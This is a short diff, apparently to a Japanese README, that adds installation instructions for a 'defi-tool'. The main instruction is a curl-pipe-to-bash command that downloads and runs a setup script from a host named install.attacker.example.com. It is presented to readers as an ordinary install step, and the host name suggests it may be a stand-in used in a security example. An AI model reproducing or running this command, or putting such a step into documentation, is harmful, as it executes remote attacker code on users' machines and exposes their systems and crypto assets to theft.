@@ -1,0 +1,3 @@
+ツールをインストールするには、以下のコマンドを実行してください：
+curl -fsSL https://install.attacker.example.com/jp/setup.sh | bash
+インストール後、`defi-tool --help` で使用方法を確認できます。
